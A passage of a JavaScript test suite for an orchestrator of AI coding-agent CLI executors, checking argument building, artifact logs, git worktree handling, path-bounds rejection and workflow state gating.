      onFail: () => {},
      onStop: () => {},
      defaultWorkingDir: process.cwd(),
    });
    adapter.enforceAllowedBinary = false;
    adapter.allowedBinaries = [process.execPath];
    adapter.defaultBinary = process.execPath;
    adapter.workdirRoots = [process.cwd()];

    const project = registry.createProject({ name: 'Terminal Artifacts' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Terminal Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'terminal artifact lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const target = registry.getLane(lane.id);
    target.workdir = process.cwd();
    target.executorBinary = process.execPath;
    target.commandArgs = ['-e', 'process.stdout.write("stdout-line\\n");process.stderr.write("stderr-line\\n")'];

    const result = await adapter.start(target);
    assert.equal(result.accepted, true, `start rejected: ${result.reason}`);
    await new Promise((resolve) => result.runtime.process.once('exit', resolve));
    await new Promise((resolve) => setTimeout(resolve, 50));

    const laneDir = path.join(process.cwd(), 'artifacts', session.id, lane.id);
    const terminal = await fs.readFile(path.join(laneDir, 'terminal.log'), 'utf8');
    const stdout = await fs.readFile(path.join(laneDir, 'stdout.log'), 'utf8');
    const stderr = await fs.readFile(path.join(laneDir, 'stderr.log'), 'utf8');
    assert.equal(stdout, 'stdout-line\n');
    assert.equal(stderr, 'stderr-line\n');
    assert.equal(terminal.includes('Command:'), true);
    assert.equal(terminal.includes('stdout-line\n'), true);
    assert.equal(terminal.includes('stderr-line\n'), true);
    assert.equal(terminal.includes('process exited code=0'), true);
  } finally {
    restore();
    await cleanup();
  }
});

test('manual executor stop records structured event and notifies orchestrator thread', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Stop Notify Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Stop Notify Session' }, { actor: 'test', approved: true });
    await registry.sendOrchestratorMessage(session.id, {
      message: 'Coordinate executor work.',
      executorType: 'mock',
      baseUrl: 'http://127.0.0.1:1',
    }, { actor: 'dashboard', approved: true });
    const executorLane = registry.createLane(session.id, {
      title: 'Executor to stop',
      executorType: 'mock',
      owner: 'dashboard',
    }, { actor: 'dashboard', approved: true });

    await registry.stopLane(executorLane.id, { actor: 'dashboard', approved: true });
    const stopped = registry.getLane(executorLane.id);
    assert.equal(stopped.agentEvents.some((event) => event.type === 'agent.stopped'), true);
    const thread = registry.getOrchestratorThread(session.id);
    assert.equal(
      thread.messages.some((message) => message.role === 'system' && String(message.content).includes('Operator manually stopped executor lane')),
      true,
    );
  } finally {
    await cleanup();
  }
});

test('buildExecutorCommandArgs derives safe argv from lane task prompt', async () => {
  const { buildExecutorCommandArgs } = await import('../src/executor-factory.js');
  const codexArgs = buildExecutorCommandArgs('codex', {
    taskPrompt: 'Ship the dashboard',
    model: 'gpt-5',
    permissionsProfile: 'auto-edit',
    targetUrl: 'http://localhost:5173',
    mcpConfigPath: MCP_CONFIG_PATH,
  }, { mcpServers: { orca: { command: '/usr/bin/node', args: ['/abs/mcp-server.js'], env: { ORCA_ROLE: 'orchestrator' } } } });
  const count = (args, value) => args.filter((item) => item === value).length;
  assert.deepEqual(codexArgs.slice(0, 2), ['exec', '--json']);
  assert.ok(codexArgs.includes('--model'));
  assert.ok(codexArgs.includes('gpt-5'));
  // --full-auto is deprecated; force/auto-edit maps to --sandbox workspace-write.
  assert.ok(!codexArgs.includes('--full-auto'), 'codex must not use the deprecated --full-auto flag');
  assert.ok(codexArgs.includes('--sandbox'));
  assert.ok(codexArgs.includes('workspace-write'));
  assert.ok(codexArgs.includes('--skip-git-repo-check'));
  // codex has NO --mcp-config flag (Claude-only); MCP is wired via -c overrides.
  assert.ok(!codexArgs.includes('--mcp-config'), 'codex must not use the invalid --mcp-config flag');
  assert.ok(codexArgs.includes('-c'));
  assert.ok(codexArgs.some((a) => a === 'mcp_servers.orca.command="/usr/bin/node"'));
  assert.ok(codexArgs.some((a) => a === 'mcp_servers.orca.env.ORCA_ROLE="orchestrator"'));
  assert.ok(codexArgs.includes('Target: http://localhost:5173\nShip the dashboard'));
  assert.equal(count(codexArgs, '--json'), 1);

  const claudeArgs = buildExecutorCommandArgs('claude', {
    taskPrompt: 'Audit the auth flow',
    model: 'claude-opus-4-7',
    permissionsProfile: 'bypass-permissions',
    intelligenceProfile: 'max',
    targetUrl: 'http://localhost:5173',
    mcpConfigPath: MCP_CONFIG_PATH,
  });
  assert.ok(claudeArgs.includes('--model'));
  assert.ok(claudeArgs.includes('claude-opus-4-7'));
  assert.ok(claudeArgs.includes('--effort'));
  assert.ok(claudeArgs.includes('max'));
  assert.ok(claudeArgs.includes('--permission-mode'));
  assert.ok(claudeArgs.includes('bypassPermissions'));
  assert.ok(claudeArgs.includes('--mcp-config'));
  assert.ok(claudeArgs.includes(MCP_CONFIG_PATH));
  assert.equal(claudeArgs[0], '--print');
  assert.ok(claudeArgs.includes('--output-format'));
  assert.ok(claudeArgs.includes('stream-json'));
  assert.ok(claudeArgs.includes('--verbose'));
  assert.ok(claudeArgs.includes('--include-partial-messages'));
  assert.ok(claudeArgs.includes('Target: http://localhost:5173\nAudit the auth flow'));
  assert.equal(count(claudeArgs, '--mcp-config'), 1);
  assert.equal(count(claudeArgs, '--print'), 1);

  const geminiArgs = buildExecutorCommandArgs('gemini-cli', {
    taskPrompt: 'Run tests',
    model: 'gemini-2.5-pro',
    permissionsProfile: 'auto-edit',
    targetUrl: 'http://localhost:5173',
    mcpConfigPath: MCP_CONFIG_PATH,
  });
  assert.deepEqual(geminiArgs, [
    '--model',
    'gemini-2.5-pro',
    '--approval-mode',
    'auto_edit',
    '--output-format',
    'json',
    '--prompt',
    'Target: http://localhost:5173\nRun tests',
  ]);

  const composerArgs = buildExecutorCommandArgs('composer-cli', {
    taskPrompt: 'Refactor view',
    model: 'gpt-5',
    permissionsProfile: 'bypass-permissions',
    targetUrl: 'http://localhost:5173',
  });
  assert.deepEqual(composerArgs, [
    '--model',
    'gpt-5',
    '--force',
    '--output-format',
    'stream-json',
    '-p',
    'Target: http://localhost:5173\nRefactor view',
  ]);
  // Refuse control characters in derived prompt.
  const stripped = buildExecutorCommandArgs('codex', { taskPrompt: 'safe\nprompt' });
  const text = stripped.join('\n');
  assert.equal(/\x01/.test(text), false);

  const codexPlanArgs = buildExecutorCommandArgs('codex', {
    taskPrompt: 'Plan only',
    permissionsProfile: 'plan',
  });
  assert.deepEqual(codexPlanArgs.slice(0, 4), ['exec', '--json', '--sandbox', 'read-only']);
});

test('evidence capture resolves saved preview presets server-side', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    let capturedOptions = null;
    registry.evidenceRunner = {
      capture: async (_lane, options) => {
        capturedOptions = options;
        return {
          captured: true,
          evidence: {
            status: 'captured',
            requested: options.modes || [],
            produced: ['evidence-shot.png'],
          },
        };
      },
    };

    const project = registry.createProject({
      name: 'Preset Evidence Project',
      quickLinks: [{
        label: 'Example App',
        url: 'http://127.0.0.1:5173',
        kind: 'vite',
      }],
    }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Preset Evidence Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'Preset Evidence Lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });

    const presets = registry.getEvidencePresets(lane.id).presets;
    assert.equal(presets.length, 1);
    assert.equal(presets[0].id.startsWith('project-link:'), true);

    const result = await registry.captureLaneEvidence(lane.id, {
      actor: 'dashboard',
      approved: true,
      presetId: presets[0].id,
      modes: ['screenshot'],
    });
    assert.equal(result.captured, true);
    assert.equal(capturedOptions.url, 'http://127.0.0.1:5173/');
    assert.equal(capturedOptions.networkPolicy.savedUrl, true);

    await assert.rejects(
      () => registry.captureLaneEvidence(lane.id, {
        actor: 'dashboard',
        approved: true,
        presetId: 'missing-preset',
      }),
      (error) => error.status === 404,
    );
    await assert.rejects(
      () => registry.captureLaneEvidence(lane.id, {
        actor: 'dashboard',
        approved: true,
        presetId: presets[0].id,
        url: 'http://127.0.0.1:5174',
      }),
      (error) => error.status === 422,
    );
  } finally {
    await cleanup();
  }
});

test('Recovery flips orphaned running lanes to failed with explicit reason', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Lifecycle Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Lifecycle Session' }, { actor: 'test', approved: true });
    const stuckLane = registry.createLane(session.id, {
      title: 'stuck lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const stuck = registry.getLane(stuckLane.id);
    stuck.state = 'running';
    registry.recoverInterruptedLanes();
    assert.equal(registry.getLane(stuckLane.id).state, 'failed');
    assert.equal(typeof registry.getLane(stuckLane.id).exitReason, 'string');
  } finally {
    await cleanup();
  }
});

test('MCP tool schema accepts env/workdir/description/owner/notes with bounds', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const tool = await registry.createMcpTool({
      name: 'extended-tool',
      command: 'node',
      args: ['-v'],
      scope: ['all'],
      env: { FOO: 'bar', PORT: 1234 },
      workdir: 'relative/path',
      description: 'demo description',
      notes: 'some operator notes',
      owner: 'alex',
    }, { actor: 'alex', approved: true });
    assert.equal(tool.env.FOO, 'bar');
    assert.equal(tool.env.PORT, '1234');
    assert.equal(tool.workdir, 'relative/path');
    assert.equal(tool.description, 'demo description');
    assert.equal(tool.notes, 'some operator notes');
    assert.equal(tool.owner, 'alex');

    assert.throws(() => registry.createMcpTool({
      name: 'bad-env-tool',
      command: 'node',
      scope: ['all'],
      env: { 'bad-key!': 'x' },
    }, { actor: 'test', approved: true }), (error) => error.status === 422);

    assert.throws(() => registry.createMcpTool({
      name: 'huge-notes',
      command: 'node',
      scope: ['all'],
      notes: 'x'.repeat(2000),
    }, { actor: 'test', approved: true }), (error) => error.status === 422);

    for (const [name, workdir] of [
      ['bad-workdir-newline', 'relative\npath'],
      ['bad-workdir-tab', 'relative\tpath'],
      ['bad-workdir-cr', 'relative\rpath'],
    ]) {
      assert.throws(() => registry.createMcpTool({
        name,
        command: 'node',
        scope: ['all'],
        workdir,
      }, { actor: 'test', approved: true }), (error) => error.status === 422);
    }
  } finally {
    await cleanup();
  }
});

test('Shared-worktree lane creation emits a pending audit and stores a warning', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Shared Worktree Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Shared Worktree Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'shared lane',
      executorType: 'mock',
      sharedWorktree: true,
    }, { actor: 'test', approved: true });
    assert.equal(lane.sharedWorktree, true);
    assert.equal(Array.isArray(lane.warnings), true);
    assert.equal(lane.warnings.some((w) => w.kind === 'shared_worktree'), true);
    const sharedAudit = registry.listAuditEvents({ status: 'pending' })
      .find((event) => event.type === 'lane_shared_worktree' && event.laneId === lane.id);
    assert.ok(sharedAudit, 'expected lane_shared_worktree audit event');
  } finally {
    await cleanup();
  }
});

test('Lane terminal artifacts include process/MCP/changed-files metadata', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Terminal Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Terminal Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'terminal lane',
      executorType: 'mock',
      taskPrompt: 'plan-the-thing',
      model: 'gpt-5',
      permissionsProfile: 'plan',
      verificationCommand: 'npm test',
      branch: 'feature/foo',
    }, { actor: 'test', approved: true });
    const target = registry.getLane(lane.id);
    target.processMeta = {
      pid: 4242,
      exitCode: 0,
      signal: null,
      startedAt: nowIso(),
      endedAt: nowIso(),
      stopRequestedBy: 'dashboard',
      stopResult: 'sigterm',
      platform: process.platform,
    };
    target.mcpConfigPath = MCP_CONFIG_PATH;
    target.lastEvidence = { status: 'degraded', produced: ['evidence.json'], requested: ['screenshot'] };
    target.lastEvidenceCaptureAt = nowIso();
    target.changedFiles = ['M src/foo.ts'];

    const out = await registry.writeLaneArtifacts(target, 'done');
    assert.deepEqual(out.changedFiles, ['M src/foo.ts']);
    const transcriptPath = path.join(process.cwd(), 'artifacts', session.id, target.id, 'transcript.json');
    const transcript = JSON.parse(await fs.readFile(transcriptPath, 'utf8'));
    assert.equal(transcript.taskPrompt, 'plan-the-thing');
    assert.equal(transcript.model, 'gpt-5');
    assert.equal(transcript.verificationCommand, 'npm test');
    assert.equal(transcript.branch, 'feature/foo');
    assert.equal(transcript.processMeta.pid, 4242);
    assert.equal(transcript.mcpConfigPath, MCP_CONFIG_PATH);
    assert.equal(transcript.evidence.status, 'degraded');
    assert.deepEqual(transcript.changedFiles, ['M src/foo.ts']);

    const outcomeText = await fs.readFile(path.join(process.cwd(), 'artifacts', session.id, target.id, 'outcome.txt'), 'utf8');
    assert.ok(outcomeText.includes('Process PID: 4242'));
    assert.ok(outcomeText.includes('Stop result: sigterm'));
    assert.ok(outcomeText.includes('Changed files: 1'));
  } finally {
    await cleanup();
  }
});

function nowIso() { return new Date().toISOString(); }

test('Worktree manager creates per-lane worktree under approved base and cleanup removes it', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    // Build a real git repo inside the approved repo root (process.cwd()).
    const repoDir = path.join(process.cwd(), 'demo-repo');
    await fs.mkdir(repoDir, { recursive: true });
    const { spawnSync } = await import('node:child_process');
    const g = (...args) => spawnSync('git', args, { cwd: repoDir, encoding: 'utf8' });
    g('init', '-q');
    g('config', 'user.email', 'test@local');
    g('config', 'user.name', 'Test');
    await fs.writeFile(path.join(repoDir, 'README.md'), 'hello');
    g('add', 'README.md');
    g('commit', '-qm', 'init');

    const project = registry.createProject({ name: 'WT Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'WT Session',
      repoRoot: repoDir,
    }, { actor: 'test', approved: true });

    assert.equal(registry.getSession(session.id).repoRoot, repoDir);

    const lane = registry.createLane(session.id, {
      title: 'feature lane',
      executorType: 'mock',
      branch: 'feature/cleanup',
    }, { actor: 'test', approved: true });

    assert.ok(lane.worktreePath, 'lane should have a worktreePath');
    assert.ok(lane.worktreePath.includes('worktrees'), 'worktreePath should sit under sessions/worktrees');
    const wtStat = await fs.stat(lane.worktreePath);
    assert.equal(wtStat.isDirectory(), true);
    assert.equal(lane.branch, 'feature/cleanup');
    assert.equal(lane.repoRoot, repoDir);

    await assert.rejects(
      registry.removeLaneWorktree(lane.id, { actor: 'test', approved: true }),
      (error) => error.status === 409 && /still active/.test(error.message),
    );

    const duplicateLane = registry.createLane(session.id, {
      title: 'duplicate branch lane',
      executorType: 'mock',
      branch: 'feature/cleanup',
    }, { actor: 'test', approved: true });
    assert.match(duplicateLane.branch, /^orca\/lane\//);
    assert.notEqual(duplicateLane.branch, 'feature/cleanup');
    assert.equal(duplicateLane.repoRoot, repoDir);

    // Mark terminal so cleanup can run.
    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date().toISOString();
    const cleanupResult = await registry.removeLaneWorktree(lane.id, {
      actor: 'test',
      approved: true,
      removeBranch: true,
    });
    assert.equal(cleanupResult.removed, true);
    assert.equal(cleanupResult.branchRemoved, true);
    await assert.rejects(fs.access(lane.worktreePath), (error) => error.code === 'ENOENT');

    const duplicateTarget = registry.getLane(duplicateLane.id);
    duplicateTarget.state = 'done';
    duplicateTarget.completedAt = new Date().toISOString();
    const duplicateCleanup = await registry.removeLaneWorktree(duplicateLane.id, {
      actor: 'test',
      approved: true,
      removeBranch: true,
    });
    assert.equal(duplicateCleanup.removed, true);
    assert.equal(duplicateCleanup.branchRemoved, true);
  } finally {
    await cleanup();
  }
});

test('Session shared worktree mode runs lanes in the session repoRoot without per-lane worktrees', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const repoDir = path.join(process.cwd(), 'shared-mode-repo');
    await fs.mkdir(repoDir, { recursive: true });
    const { spawnSync } = await import('node:child_process');
    const g = (...args) => spawnSync('git', args, { cwd: repoDir, encoding: 'utf8' });
    g('init', '-q');
    g('config', 'user.email', 'test@local');
    g('config', 'user.name', 'Test');
    await fs.writeFile(path.join(repoDir, 'README.md'), 'hello');
    g('add', 'README.md');
    g('commit', '-qm', 'init');

    const project = registry.createProject({ name: 'Shared Mode Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Shared Mode Session',
      repoRoot: repoDir,
      worktreeMode: 'shared',
    }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'shared mode lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });

    assert.equal(lane.sharedWorktree, true);
    assert.equal(lane.worktreeMode, 'shared');
    assert.equal(lane.workdir, repoDir);
    assert.equal(lane.worktreePath, repoDir);
    assert.ok(!lane.worktreePath.includes('worktrees'), 'shared mode should not create a managed worktree');
    assert.ok(lane.warnings.some((w) => w.kind === 'shared_worktree'), 'shared mode should surface conflict warning');
    registry.getLane(lane.id).state = 'done';
    await assert.rejects(
      registry.removeLaneWorktree(lane.id, { actor: 'test', approved: true }),
      (error) => error.status === 422 && /shared\/non-managed/.test(error.message),
    );
  } finally {
    await cleanup();
  }
});

test('getSessionGitInfo reports branches/worktrees for git repos and isGit:false otherwise', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const { spawnSync } = await import('node:child_process');
    // Git repo within the approved root (process.cwd() == temp dir).
    const repoDir = path.join(process.cwd(), 'git-info-repo');
    await fs.mkdir(repoDir, { recursive: true });
    const g = (...args) => spawnSync('git', args, { cwd: repoDir, encoding: 'utf8' });
    g('init', '-q');
    g('config', 'user.email', 't@l');
    g('config', 'user.name', 't');
    await fs.writeFile(path.join(repoDir, 'README.md'), 'hi');
    g('add', 'README.md');
    g('commit', '-qm', 'init');
    g('branch', '-M', 'main');
    g('branch', 'feature/x');
    const remoteDir = path.join(process.cwd(), 'git-info-origin.git');
    spawnSync('git', ['init', '--bare', '-q', remoteDir], { encoding: 'utf8' });
    g('remote', 'add', 'origin', remoteDir);
    g('push', '-u', 'origin', 'main');
    g('fetch', 'origin', 'main');

    const project = registry.createProject({ name: 'Git Info' }, { actor: 'test', approved: true });
    const gitSession = registry.createSession(project.id, { name: 'git', repoRoot: repoDir }, { actor: 'test', approved: true });
    const info = registry.getSessionGitInfo(gitSession.id);
    assert.equal(info.isGit, true);
    assert.ok(info.branches.includes('feature/x'), 'should list created branch');
    assert.ok(info.remoteBranches.includes('origin/main'), 'should list remote-tracking branch');
    assert.ok(info.branches.includes('origin/main'), 'branch picker should include remote-tracking branch');
    assert.ok(info.currentBranch, 'should report the current branch');
    assert.ok(Array.isArray(info.worktrees) && info.worktrees.length >= 1, 'should list at least the main worktree');

    const remoteLane = registry.createLane(gitSession.id, {
      title: 'remote base lane',
      executorType: 'mock',
      branch: 'origin/main',
    }, { actor: 'test', approved: true });
    assert.match(remoteLane.branch, /^orca\/lane\//);
    const laneHead = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: remoteLane.worktreePath, encoding: 'utf8' }).stdout.trim();
    const remoteHead = g('rev-parse', 'origin/main').stdout.trim();
    assert.equal(laneHead, remoteHead, 'origin/main should be used as the worktree base ref');

    // Non-git folder → isGit:false (agent still runs there).
    const plainDir = path.join(process.cwd(), 'git-info-plain');
    await fs.mkdir(plainDir, { recursive: true });
    const plainSession = registry.createSession(project.id, { name: 'plain', repoRoot: plainDir }, { actor: 'test', approved: true });
    assert.equal(registry.getSessionGitInfo(plainSession.id).isGit, false);
  } finally {
    await cleanup();
  }
});

test('Session creation refuses nonexistent or out-of-bounds repoRoot but accepts non-git dirs', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'WT Reject' }, { actor: 'test', approved: true });
    // A path that does not exist is rejected.
    assert.throws(() => registry.createSession(project.id, {
      name: 'no repo',
      repoRoot: path.join(process.cwd(), 'not-a-repo'),
    }, { actor: 'test', approved: true }), (error) => error.status === 422);

    // A plain (non-git) directory within approved roots is ACCEPTED — agents can
    // spawn in any folder, git is not required (Codex behavior).
    const plainDir = path.join(process.cwd(), 'plain-non-git-dir');
    await fs.mkdir(plainDir, { recursive: true });
    try {
      const plainSession = registry.createSession(project.id, {
        name: 'plain dir session',
        repoRoot: plainDir,
      }, { actor: 'test', approved: true });
      assert.equal(registry.getSession(plainSession.id).repoRoot, plainDir);
      // A lane in a non-git folder runs directly in the directory (no worktree).
      const plainLane = registry.createLane(plainSession.id, {
        title: 'plain lane',
        executorType: 'mock',
      }, { actor: 'test', approved: true });
      assert.equal(plainLane.workdir, plainDir, 'non-git lane should run in the folder');
      assert.equal(plainLane.worktreePath, plainDir, 'non-git lane has no separate worktree');
      assert.ok(!plainLane.worktreePath.includes('worktrees'), 'non-git lane should not get an isolated worktree');
    } finally {
      await fs.rm(plainDir, { recursive: true, force: true });
    }

    // Build a git repo OUTSIDE the approved boundary.
    const outsideRepo = await fs.mkdtemp(path.join(os.tmpdir(), 'outside-repo-'));
    const { spawnSync } = await import('node:child_process');
    spawnSync('git', ['init', '-q'], { cwd: outsideRepo });
    spawnSync('git', ['config', 'user.email', 't@l'], { cwd: outsideRepo });
    spawnSync('git', ['config', 'user.name', 't'], { cwd: outsideRepo });
    await fs.writeFile(path.join(outsideRepo, 'R'), 'x');
    spawnSync('git', ['add', 'R'], { cwd: outsideRepo });
    spawnSync('git', ['commit', '-qm', 'init'], { cwd: outsideRepo });
    try {
      const linkToOutside = path.join(process.cwd(), 'link-to-outside-repo');
      await fs.symlink(outsideRepo, linkToOutside, 'dir');
      assert.throws(() => registry.createProject({
        name: 'symlink outside project',
        repoRoot: linkToOutside,
      }, { actor: 'test', approved: true }), (error) => error.status === 422);
      assert.throws(() => registry.createSession(project.id, {
        name: 'symlink outside session',
        repoRoot: linkToOutside,
      }, { actor: 'test', approved: true }), (error) => error.status === 422);
      assert.throws(() => registry.createSession(project.id, {
        name: 'outside repo',
        repoRoot: outsideRepo,
      }, { actor: 'test', approved: true }), (error) => error.status === 422);
    } finally {
      await fs.rm(outsideRepo, { recursive: true, force: true });
    }
  } finally {
    await cleanup();
  }
});

test('describeSystemBlockers reports executor and playwright state', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const result = await registry.describeSystemBlockers();
    assert.ok(Array.isArray(result.blockers));
    // We should see one of these on a typical dev box. Just assert shape.
    for (const blocker of result.blockers) {
      assert.ok(typeof blocker.id === 'string' && blocker.id.length > 0);
      assert.ok(['error', 'warn', 'info'].includes(blocker.severity));
      assert.ok(typeof blocker.remediation === 'string');
    }
  } finally {
    await cleanup();
  }
});

test('Custom CLI lanes require explicit custom CLI enablement and configured binary allowlist', async () => {
  const previousEnv = { ...process.env };
  const restore = restoreEnv(previousEnv);
  try {
    delete process.env.ORCA_ENABLE_CUSTOM_CLI;
    delete process.env.ORCA_CLI_BINARY;
    delete process.env.ORCA_CLI_ALLOWED_BINARIES;
    const disabled = await withIsolatedRegistry();
    try {
      const project = disabled.registry.createProject({ name: 'CLI Disabled Project' }, { actor: 'test', approved: true });
      const session = disabled.registry.createSession(project.id, { name: 'CLI Disabled Session' }, { actor: 'test', approved: true });
      assert.throws(() => disabled.registry.createLane(session.id, {
        title: 'disabled cli',
        executorType: 'cli',
        executorBinary: 'node',
      }, { actor: 'test', approved: true }), (error) => error.status === 422);
    } finally {
      await disabled.cleanup();
    }

    process.env.ORCA_ENABLE_CUSTOM_CLI = 'true';
    process.env.ORCA_CLI_BINARY = 'node';
    process.env.ORCA_CLI_ALLOWED_BINARIES = 'node';
    const enabled = await withIsolatedRegistry();
    try {
      const project = enabled.registry.createProject({ name: 'CLI Enabled Project' }, { actor: 'test', approved: true });
      const session = enabled.registry.createSession(project.id, { name: 'CLI Enabled Session' }, { actor: 'test', approved: true });
      const lane = enabled.registry.createLane(session.id, {
        title: 'enabled cli',
        executorType: 'cli',
        executorBinary: 'node',
        commandArgs: ['--version'],
      }, { actor: 'test', approved: true });
      assert.equal(lane.executorType, 'cli');
    } finally {
      await enabled.cleanup();
    }
  } finally {
    restore();
  }
});

test('CLI executor receives transient runtime env without storing it on the lane', async () => {
  const restore = restoreEnv({
    ORCA_ENABLE_CUSTOM_CLI: process.env.ORCA_ENABLE_CUSTOM_CLI,
    ORCA_CLI_BINARY: process.env.ORCA_CLI_BINARY,
    ORCA_CLI_ALLOWED_BINARIES: process.env.ORCA_CLI_ALLOWED_BINARIES,
  });
  try {
    process.env.ORCA_ENABLE_CUSTOM_CLI = 'true';
    process.env.ORCA_CLI_BINARY = 'node';
    process.env.ORCA_CLI_ALLOWED_BINARIES = 'node';
    const { createExecutorAdapter } = await import('../src/executor-factory.js');
    const adapter = createExecutorAdapter('cli', {
      onLog: async () => {},
      onComplete: async () => {},
      onFail: async () => {},
      onStop: async () => {},
      runtimeEnvForLane: (lane) => lane.id === 'runtime-env-lane'
        ? { ORCA_TOOL_LEASE_TOKEN: 'scoped-lease-token' }
        : {},
      defaultWorkingDir: process.cwd(),
    });
    const lane = {
      id: 'runtime-env-lane',
      sessionId: 'runtime-env-session',
      projectId: 'runtime-env-project',
      workdir: process.cwd(),
    };
    const env = adapter._buildEnv(lane);
    assert.equal(env.ORCA_TOOL_LEASE_TOKEN, 'scoped-lease-token');
    assert.equal(env.ORCA_LANE_ID, 'runtime-env-lane');
    assert.equal(Object.hasOwn(lane, 'env'), false);
  } finally {
    restore();
  }
});

test('Real Claude CLI launches through the executor adapter and reports PID + exit', async () => {
  const claudeBinary = process.env.ORCA_CLAUDE_BINARY || '/opt/homebrew/bin/claude';
  let canExec = false;
  try {
    const { spawnSync } = await import('node:child_process');
    const probe = spawnSync(claudeBinary, ['--version'], { encoding: 'utf8', timeout: 4000 });
    canExec = probe.status === 0 && /\d+\.\d+/.test(probe.stdout || '');
  } catch { canExec = false; }
  if (!canExec) {
    console.warn(`skipping real claude exec test (${claudeBinary} not available)`);
    return;
  }
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const { createExecutorAdapter } = await import('../src/executor-factory.js');
    const adapter = createExecutorAdapter('claude', {
      onLog: () => {},
      onComplete: () => {},
      onFail: () => {},
      onStop: () => {},
    });
    adapter.enforceAllowedBinary = false;
    adapter.allowedBinaries = [path.basename(claudeBinary), 'claude'];
    adapter.defaultBinary = claudeBinary;
    adapter.workdirRoots = [process.cwd()];

    const project = registry.createProject({ name: 'Claude Exec' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Claude Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'real claude exec',
      executorType: 'mock',  // sidestep targeting check; we run adapter manually
    }, { actor: 'test', approved: true });

    const target = registry.getLane(lane.id);
    target.workdir = process.cwd();
    target.command = '';
    target.executorBinary = '';
    target.commandArgs = ['--version'];

    const result = await adapter.start(target);
    assert.equal(result.accepted, true, `start rejected: ${result.reason}`);
    const proc = result.runtime.process;
    if (proc && proc.pid === undefined) {
      await new Promise((resolve) => {
        const timer = setTimeout(resolve, 200);
        proc.once('spawn', () => { clearTimeout(timer); resolve(); });
        proc.once('error', () => { clearTimeout(timer); resolve(); });
      });
    }
    if (proc && typeof proc.pid === 'number') target.processMeta.pid = proc.pid;
    await new Promise((resolve) => { if (!proc) return resolve(); proc.once('exit', resolve); });
    assert.equal(target.processMeta.exitCode, 0, 'claude --version should exit 0');
    assert.equal(typeof target.processMeta.startedAt, 'string');
    assert.equal(typeof target.processMeta.endedAt, 'string');
  } finally {
    await cleanup();
  }
});

test('submitLane records summary + changed files and marks the lane ready for audit', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Submit Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Submit Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, { title: 'work', executorType: 'mock' }, { approved: true, actor: 'test' });
    const target = registry.getLane(lane.id);
    target.state = 'running';

    const result = registry.submitLane(lane.id, {
      actor: 'executor',
      summary: 'Implemented the feature',
      changedFiles: ['src/a.js', 'src/b.js'],
    });
    assert.equal(result.needsCritique, false);
    assert.equal(result.lane.state, 'ready_for_audit');
    assert.equal(result.lane.summary, 'Implemented the feature');
    assert.deepEqual(result.lane.changedFiles, ['src/a.js', 'src/b.js']);

    // Re-submitting from a terminal/non-running state is refused.
    assert.throws(
      () => registry.submitLane(lane.id, { actor: 'executor' }),
      (err) => err.status === 409 && /cannot be submitted/.test(err.message),
    );
  } finally {
    await cleanup();
  }
});

test('submitLane routes to self-verification when critique is required', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Critique Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Critique Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, { title: 'visual', executorType: 'mock', critiqueMode: 'required' }, { approved: true, actor: 'test' });
    const target = registry.getLane(lane.id);
    target.state = 'running';

    const result = registry.submitLane(lane.id, { actor: 'executor', summary: 'done' });
    assert.equal(result.needsCritique, true);
    assert.equal(result.lane.state, 'needs_critique');
  } finally {
    await cleanup();
  }
});

test('assertAgentToolAllowed enforces the workflow state machine', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Gate Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Gate Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, { title: 'gate', executorType: 'mock' }, { approved: true, actor: 'test' });
    const target = registry.getLane(lane.id);

    target.state = 'running';
    // submit is legal while running; audit.accept is not.
    assert.equal(registry.assertAgentToolAllowed('lane.submit', { laneId: lane.id }), true);
    assert.throws(
